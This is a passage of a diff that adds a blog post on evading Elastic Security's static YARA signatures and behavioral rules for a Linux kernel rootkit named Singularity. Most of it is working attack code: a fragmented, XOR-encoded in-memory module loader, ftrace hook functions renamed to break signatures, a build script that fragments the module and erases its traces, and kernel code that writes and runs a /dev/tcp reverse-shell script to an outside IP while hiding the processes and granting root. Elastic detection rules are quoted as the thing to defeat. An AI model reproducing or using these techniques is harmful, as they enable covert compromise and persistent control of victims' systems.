+</span></span><span class="line"><span class="cl">        <span class="kt">size_t</span> <span class="n">size</span> <span class="o">=</span> <span class="n">fragments</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">size</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="c1">// Decode if necessary
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">if</span> <span class="p">(</span><span class="n">is_encoded</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nf">xor_decode</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="n">xor_key</span><span class="p">,</span> <span class="n">XOR_KEY_SIZE</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="c1">// Write to memfd
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">write</span><span class="p">(</span><span class="n">memfd</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="c1">// Reset FD position
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">lseek</span><span class="p">(</span><span class="n">memfd</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">SEEK_SET</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="c1">// 5. Load module via direct syscall
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">load_module_stealthy</span><span class="p">(</span><span class="n">memfd</span><span class="p">,</span> <span class="n">module_params</span><span class="p">,</span> <span class="n">MODULE_FLAGS</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="c1">// 6. Cleanup
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">close</span><span class="p">(</span><span class="n">memfd</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>Advantages of This Approach:</p>
+<ul>
+<li>No .ko file on disk after compilation</li>
+<li>Fragments can be deleted after loading</li>
+<li>Memory-only module existence</li>
+</ul>
+<p>Static Analysis Resistance:</p>
+<ul>
+<li>Individual fragments don&rsquo;t match YARA signatures</li>
+<li>XOR encoding breaks pattern matching</li>
+<li>No complete ELF structure visible on disk</li>
+</ul>
+<h1 id="evasion-technique-4-ftrace-helper-obfuscation">Evasion Technique 4: Ftrace Helper Obfuscation<a hidden class="anchor" aria-hidden="true" href="#evasion-technique-4-ftrace-helper-obfuscation">#</a></h1>
+<h3 id="the-problem-3">The Problem<a hidden class="anchor" aria-hidden="true" href="#the-problem-3">#</a></h3>
+<p>Elastic&rsquo;s rule f07bcabe targets ftrace-based rootkits by detecting function names:</p>
+<pre tabindex="0"><code>$str1 = &#34;fh_install_hook&#34;
+$str2 = &#34;fh_remove_hook&#34;
+$str3 = &#34;fh_resolve_hook_address&#34;
+Condition: 2 of them
+</code></pre><p>These are standard function names in ftrace hooking frameworks, making them easy signatures.</p>
+<h3 id="the-solution-rename-ftrace-framework-functions">The Solution: Rename Ftrace Framework Functions<a hidden class="anchor" aria-hidden="true" href="#the-solution-rename-ftrace-framework-functions">#</a></h3>
+<p>Our obfuscator treats ftrace helper functions like any other custom function:</p>
+<p>Before</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">// ftrace/ftrace_helper.c
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">notrace</span> <span class="kt">int</span> <span class="nf">fh_resolve_hook_address</span><span class="p">(</span><span class="k">struct</span> <span class="n">ftrace_hook</span> <span class="o">*</span><span class="n">hook</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">hook</span><span class="o">-&gt;</span><span class="n">address</span> <span class="o">=</span> <span class="nf">kallsyms_lookup_name</span><span class="p">(</span><span class="n">hook</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// ...
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">notrace</span> <span class="kt">int</span> <span class="nf">fh_install_hook</span><span class="p">(</span><span class="k">struct</span> <span class="n">ftrace_hook</span> <span class="o">*</span><span class="n">hook</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">err</span> <span class="o">=</span> <span class="nf">fh_resolve_hook_address</span><span class="p">(</span><span class="n">hook</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// ...
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">notrace</span> <span class="kt">void</span> <span class="nf">fh_remove_hook</span><span class="p">(</span><span class="k">struct</span> <span class="n">ftrace_hook</span> <span class="o">*</span><span class="n">hook</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">err</span> <span class="o">=</span> <span class="nf">unregister_ftrace_function</span><span class="p">(</span><span class="o">&amp;</span><span class="n">hook</span><span class="o">-&gt;</span><span class="n">ops</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// ...
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">notrace</span> <span class="kt">int</span> <span class="nf">fh_install_hooks</span><span class="p">(</span><span class="k">struct</span> <span class="n">ftrace_hook</span> <span class="o">*</span><span class="n">hooks</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">count</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">size_t</span> <span class="n">i</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">err</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">count</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">err</span> <span class="o">=</span> <span class="nf">fh_install_hook</span><span class="p">(</span><span class="o">&amp;</span><span class="n">hooks</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">// ...
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">notrace</span> <span class="kt">void</span> <span class="nf">fh_remove_hooks</span><span class="p">(</span><span class="k">struct</span> <span class="n">ftrace_hook</span> <span class="o">*</span><span class="n">hooks</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">count</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">size_t</span> <span class="n">i</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">count</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">fh_remove_hook</span><span class="p">(</span><span class="o">&amp;</span><span class="n">hooks</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>Example after Obfuscation:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">// obfuscated/ftrace/ftrace_helper.c
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">notrace</span> <span class="kt">int</span> <span class="nf">kern_xploqm_helper</span><span class="p">(</span><span class="k">struct</span> <span class="n">ftrace_hook</span> <span class="o">*</span><span class="n">hook</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">hook</span><span class="o">-&gt;</span><span class="n">address</span> <span class="o">=</span> <span class="nf">kallsyms_lookup_name</span><span class="p">(</span><span class="n">hook</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// ...
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">notrace</span> <span class="kt">int</span> <span class="nf">sys_zmnpqr_ops</span><span class="p">(</span><span class="k">struct</span> <span class="n">ftrace_hook</span> <span class="o">*</span><span class="n">hook</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">err</span> <span class="o">=</span> <span class="nf">kern_xploqm_helper</span><span class="p">(</span><span class="n">hook</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// ...
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">notrace</span> <span class="kt">void</span> <span class="nf">net_abqzpx_handler</span><span class="p">(</span><span class="k">struct</span> <span class="n">ftrace_hook</span> <span class="o">*</span><span class="n">hook</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">err</span> <span class="o">=</span> <span class="nf">unregister_ftrace_function</span><span class="p">(</span><span class="o">&amp;</span><span class="n">hook</span><span class="o">-&gt;</span><span class="n">ops</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// ...
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">notrace</span> <span class="kt">int</span> <span class="nf">fs_klmnop_worker</span><span class="p">(</span><span class="k">struct</span> <span class="n">ftrace_hook</span> <span class="o">*</span><span class="n">hooks</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">count</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">size_t</span> <span class="n">i</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">err</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">count</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">err</span> <span class="o">=</span> <span class="nf">sys_zmnpqr_ops</span><span class="p">(</span><span class="o">&amp;</span><span class="n">hooks</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">// ...
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">notrace</span> <span class="kt">void</span> <span class="nf">proc_qwerty_entry</span><span class="p">(</span><span class="k">struct</span> <span class="n">ftrace_hook</span> <span class="o">*</span><span class="n">hooks</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">count</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">size_t</span> <span class="n">i</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">count</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">net_abqzpx_handler</span><span class="p">(</span><span class="o">&amp;</span><span class="n">hooks</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>The obfuscated names maintain the ftrace hooking functionality while breaking the specific signature patterns that Elastic Security looks for. The functions remain fully operational since the kernel doesn&rsquo;t care about function names in loaded modules.</p>
+<h1 id="build-pipeline-automated-obfuscation-workflow">Build Pipeline: Automated Obfuscation Workflow<a hidden class="anchor" aria-hidden="true" href="#build-pipeline-automated-obfuscation-workflow">#</a></h1>
+<p>Our automated build system chains all evasion techniques in a reproducible pipeline:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="cp">#!/bin/bash
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="nb">set</span> -e
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;[*] Singularity Build&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">rm -rf obfuscated fragments loader singularity_payload*
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 1. Obfuscate and compile</span>
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;[1] Obfuscating and compiling...&#34;</span>
+</span></span><span class="line"><span class="cl">python3 obfuscator/name_randomizer.py --input . --output obfuscated
+</span></span><span class="line"><span class="cl"><span class="nb">cd</span> obfuscated <span class="o">&amp;&amp;</span> make <span class="o">&amp;&amp;</span> <span class="nb">cd</span> ..
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 2. Fragment the .ko</span>
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;[2] Fragmenting module...&#34;</span>
+</span></span><span class="line"><span class="cl">python3 obfuscator/ko_fragmenter.py --input obfuscated/singularity.ko --output fragments
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 3. CLEANUP - Remove obfuscated directory completely</span>
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;[4] Cleaning build artifacts...&#34;</span>
+</span></span><span class="line"><span class="cl">rm -rf obfuscated
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;[+] Build complete! Final files:&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;    - fragments/ (module fragments)&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;    - loader&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;    - NO obfuscated code left behind&#34;</span>
+</span></span></code></pre></div><h1 id="final-test-successful-evasion">Final Test: Successful Evasion<a hidden class="anchor" aria-hidden="true" href="#final-test-successful-evasion">#</a></h1>
+<p><img loading="lazy" src="https://i.imgur.com/U7aDfWb.png" alt="imgur"  />
+</p>
+<p>In the screenshot we run the build.sh and we can see the saved kernel module fragments and all obfuscated.</p>
+<p><img loading="lazy" src="https://i.imgur.com/aIjbJH5.png" alt="imgur"  />
+</p>
+<p>Now, using the loader, we can load Singularity without being detected.</p>
+<p><img loading="lazy" src="https://i.imgur.com/v3R3Nau.png" alt="imgur"  />
+</p>
+<p>Testing one of singularity features hiding our process and become root.</p>
+<p><img loading="lazy" src="https://i.imgur.com/g6CxiOE.png" alt="imgur"  />
+</p>
+<p>With these techniques, we successfully bypass Elastic Security&rsquo;s static detection mechanisms.</p>
+<h1 id="bonus-compilation-path-detection-bypass">Bonus: Compilation Path Detection Bypass<a hidden class="anchor" aria-hidden="true" href="#bonus-compilation-path-detection-bypass">#</a></h1>
+<p><img loading="lazy" src="https://i.imgur.com/iNyIQHD.png" alt="imgur"  />
+</p>
+<p>By default, Elastic Security actively monitors compilation activity in <code>/dev/shm</code> and automatically terminates the process when it detects suspicious operations like compiling <code>loader.c</code> or the Singularity rootkit.</p>
+<p><img loading="lazy" src="https://i.imgur.com/Dc3TZhi.png" alt="imgur"  />
+</p>
+<p><strong>Simple Evasion Technique:</strong></p>
+<p>This detection can be easily bypassed by compiling in alternative directories that are less monitored:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Instead of /dev/shm (monitored):</span>
+</span></span><span class="line"><span class="cl">gcc -o /dev/shm/loader loader.c  <span class="c1"># Detected and killed</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Use alternative paths (less scrutinized):</span>
+</span></span><span class="line"><span class="cl">gcc -o /tmp/loader loader.c      <span class="c1"># Bypasses detection</span>
+</span></span><span class="line"><span class="cl">gcc -o /var/tmp/loader loader.c  <span class="c1"># Bypasses detection</span>
+</span></span></code></pre></div><p><strong>Why This Works:</strong></p>
+<p>I think elastic&rsquo;s behavioral detection rules prioritize monitoring <code>/dev/shm</code> due to its common use in malware (thinking like an attacker, I would clearly use <code>/dev/shm</code> to download and use exploits in that directory). Alternative writable directories like <code>/tmp</code> and <code>/var/tmp</code> receive less aggressive monitoring, allowing the compilation and execution of the loader without triggering automated termination.</p>
+<h1 id="bonus-2-bypassing-elastic-behavioral-detection-for-reverse-shells">Bonus 2: Bypassing Elastic Behavioral Detection for Reverse Shells<a hidden class="anchor" aria-hidden="true" href="#bonus-2-bypassing-elastic-behavioral-detection-for-reverse-shells">#</a></h1>
+<p>The latest version of Singularity triggers a reverse shell via ICMP packet hooking. While the previous techniques bypassed static YARA signatures, Elastic&rsquo;s behavioral detection rules caught the reverse shell execution.</p>
+<h2 id="the-detection-problem">The Detection Problem<a hidden class="anchor" aria-hidden="true" href="#the-detection-problem">#</a></h2>
+<p><img loading="lazy" src="https://i.imgur.com/mxNbtVX.png" alt="imgur"  />
+
+<img loading="lazy" src="https://i.imgur.com/3hPxXPD.png" alt="imgur"  />
+</p>
+<p>Elastic triggered two behavioral alerts:</p>
+<ul>
+<li><strong>&ldquo;Suspicious Execution via setsid and nohup&rdquo;</strong> (Risk: 73)</li>
+<li><strong>&ldquo;Shell Command Execution via Kworker&rdquo;</strong> (Risk: 99)</li>
+</ul>
+<h3 id="elastics-behavioral-rules">Elastic&rsquo;s Behavioral Rules<a hidden class="anchor" aria-hidden="true" href="#elastics-behavioral-rules">#</a></h3>
+<p><strong>Rule 1:</strong> Detects <code>setsid</code>/<code>nohup</code> + <code>/dev/tcp/*</code> patterns<br>
+<strong>Rule 2:</strong> Detects shell processes using <code>/dev/tcp/</code> or <code>/dev/udp/</code></p>
+<p>Both rules automatically kill the process on detection.</p>
+<p><strong>Rule 2 Detection Logic:</strong></p>
+<pre tabindex="0"><code>process where event.action == &#34;exec&#34; and 
+process.name in (&#34;sh&#34;, &#34;bash&#34;, &#34;zsh&#34;, &#34;dash&#34;, &#34;zmodload&#34;) and
+process.command_line like~ (&#34;*/dev/tcp/*&#34;, &#34;*/dev/udp/*&#34;, &#34;*zsh/net/tcp*&#34;, &#34;*zsh/net/udp*&#34;)
+</code></pre><p>The rule scans the <strong>entire command line</strong> for <code>/dev/tcp/</code> patterns, making simple obfuscation ineffective.</p>
+<h2 id="original-detected-code">Original Detected Code<a hidden class="anchor" aria-hidden="true" href="#original-detected-code">#</a></h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">// DETECTED by Elastic
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nf">snprintf</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">cmd</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">         <span class="s">&#34;bash -c &#39;&#34;</span>
+</span></span><span class="line"><span class="cl">         <span class="s">&#34;PID=$$; &#34;</span>
+</span></span><span class="line"><span class="cl">         <span class="s">&#34;kill -59 $PID; &#34;</span>
+</span></span><span class="line"><span class="cl">         <span class="s">&#34;exec -a </span><span class="se">\&#34;</span><span class="s">%s</span><span class="se">\&#34;</span><span class="s"> /bin/bash &amp;&gt;/dev/tcp/%s/%s 0&gt;&amp;1&#34;</span>
+</span></span><span class="line"><span class="cl">         <span class="s">&#34;&#39; &amp;&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">         <span class="n">PROC_NAME</span><span class="p">,</span> <span class="n">YOUR_SRV_IP</span><span class="p">,</span> <span class="n">SRV_PORT</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="s">&#34;/usr/bin/setsid&#34;</span><span class="p">,</span> <span class="s">&#34;/bin/bash&#34;</span><span class="p">,</span> <span class="s">&#34;-c&#34;</span><span class="p">,</span> <span class="n">cmd</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">};</span>
+</span></span></code></pre></div><p><strong>Why detected:</strong></p>
+<ul>
+<li>Uses <code>setsid</code> command</li>
+<li><code>/dev/tcp/</code> appears in process arguments</li>
+<li>Shell spawned from kernel worker context</li>
+</ul>
+<h2 id="working-evasion-staged-script-execution">Working Evasion: Staged Script Execution<a hidden class="anchor" aria-hidden="true" href="#working-evasion-staged-script-execution">#</a></h2>
+<p>The solution is to <strong>separate the malicious payload from process arguments</strong> by writing the script to disk first, then executing it.</p>
+<h3 id="key-changes">Key Changes<a hidden class="anchor" aria-hidden="true" href="#key-changes">#</a></h3>
+<p><strong>1. Write the script to disk:</strong></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#define SCRIPT_PATH &#34;/singularity&#34;
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="c1">// Hide kworker immediately
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nf">add_hidden_pid</span><span class="p">(</span><span class="n">current</span><span class="o">-&gt;</span><span class="n">pid</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// Create script with automatic process hiding
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nf">snprintf</span><span class="p">(</span><span class="n">script</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">script</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">         <span class="s">&#34;#!/bin/bash</span><span class="se">\n</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">         <span class="s">&#34;exec 196&lt;&gt;/dev/tcp/%s/%s</span><span class="se">\n</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">         <span class="s">&#34;sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196 &amp;</span><span class="se">\n</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">         <span class="s">&#34;SHELL_PID=$!</span><span class="se">\n</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">         <span class="s">&#34;sleep 1</span><span class="se">\n</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">         <span class="s">&#34;kill -59 $SHELL_PID</span><span class="se">\n</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">         <span class="s">&#34;kill -59 $$</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">         <span class="n">YOUR_SRV_IP</span><span class="p">,</span> <span class="n">SRV_PORT</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">f</span> <span class="o">=</span> <span class="nf">filp_open</span><span class="p">(</span><span class="n">SCRIPT_PATH</span><span class="p">,</span> <span class="n">O_WRONLY</span> <span class="o">|</span> <span class="n">O_CREAT</span> <span class="o">|</span> <span class="n">O_TRUNC</span><span class="p">,</span> <span class="mo">0755</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nf">kernel_write</span><span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="n">script</span><span class="p">,</span> <span class="nf">strlen</span><span class="p">(</span><span class="n">script</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">pos</span><span class="p">);</span>
+</span></span></code></pre></div><p><strong>2. Execute with clean command line:</strong></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="s">&#34;/bin/bash&#34;</span><span class="p">,</span> <span class="n">SCRIPT_PATH</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">};</span>
+</span></span><span class="line"><span class="cl"><span class="nf">call_usermodehelper_exec</span><span class="p">(</span><span class="n">sub_info</span><span class="p">,</span> <span class="n">UMH_WAIT_PROC</span><span class="p">);</span>
+</span></span></code></pre></div><h3 id="how-it-works">How It Works<a hidden class="anchor" aria-hidden="true" href="#how-it-works">#</a></h3>
+<p><strong>Step 1:</strong> The rootkit immediately hides the kworker thread executing the payload using <code>add_hidden_pid(current-&gt;pid)</code>, making the entire process chain invisible from the start.</p>
+<p><strong>Step 2:</strong> It writes <code>/singularity</code> containing:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="cp">#!/bin/bash
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="nb">exec</span> 196&lt;&gt;/dev/tcp/192.168.200.164/8081
+</span></span><span class="line"><span class="cl">sh &lt;<span class="p">&amp;</span><span class="m">196</span> &gt;<span class="p">&amp;</span><span class="m">196</span> 2&gt;<span class="p">&amp;</span><span class="m">196</span> <span class="p">&amp;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">SHELL_PID</span><span class="o">=</span><span class="nv">$!</span>
+</span></span><span class="line"><span class="cl">sleep <span class="m">1</span>
+</span></span><span class="line"><span class="cl"><span class="nb">kill</span> -59 <span class="nv">$SHELL_PID</span>
+</span></span><span class="line"><span class="cl"><span class="nb">kill</span> -59 <span class="nv">$$</span>
+</span></span></code></pre></div><p>The script:</p>
+<ol>
+<li>Opens TCP connection on file descriptor 196</li>
+<li>Spawns reverse shell (<code>sh</code>) in background using that connection</li>
+<li>Captures the specific PID of the spawned shell: <code>SHELL_PID=$!</code></li>
+<li>Waits 1 second for connection to establish</li>
+<li>Runs <code>kill -59 $SHELL_PID</code> to hide only the reverse shell process</li>
+<li>Runs <code>kill -59 $$</code> to hide the parent bash script</li>
+</ol>
+<p>This approach only hides the specific processes created by the script, avoiding interference with legitimate system <code>sh</code> processes.</p>
+<p><strong>Step 3:</strong> Execute the script. Elastic sees only:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">/bin/bash /singularity
+</span></span></code></pre></div><p>No <code>/dev/tcp/</code> in the command line - detection bypassed.</p>
+<p><strong>Step 4:</strong> Inside the script, automatic hiding occurs:</p>
+<ol>
+<li>Reverse shell spawns in background</li>
+<li>Script captures the exact PID using <code>$!</code> variable</li>
+<li>Waits 1 second for connection to establish</li>
+<li><code>kill -59 $SHELL_PID</code> hides only the spawned reverse shell</li>
+<li><code>kill -59 $$</code> hides the parent bash script</li>
+</ol>
+<p>Only the specific processes created by the rootkit are hidden, leaving legitimate system processes untouched.</p>
+<p><img loading="lazy" src="https://i.imgur.com/ov9YPSL.png" alt="imgur"  />
+</p>
+<h2 id="result">Result<a hidden class="anchor" aria-hidden="true" href="#result">#</a></h2>
+<p><strong>No behavioral alerts triggered</strong><br>
+<strong>Reverse shell establishes successfully</strong><br>
+<strong>Processes completely invisible to monitoring tools</strong><br>
+<strong>Root privileges granted automatically</strong></p>
+<p>Elastic&rsquo;s behavioral rules scan entire command lines for patterns like <code>/dev/tcp/</code>. By writing the payload to a script file first and executing it with a clean command line, we bypass detection while maintaining full functionality. The rootkit&rsquo;s <code>kill -59</code> signal automatically handles privilege escalation and process hiding.</p>
+<h1 id="conclusion">Conclusion<a hidden class="anchor" aria-hidden="true" href="#conclusion">#</a></h1>
+<p>This research demonstrates techniques to evade Elastic Security&rsquo;s static YARA signatures and behavioral detection rules through:</p>
+<ul>
+<li>Static Signature Evasion: String fragmentation and symbol randomization</li>
+<li>Behavioral Detection Evasion: Staged script execution and process hiding via rootkit hooks</li>
+</ul>
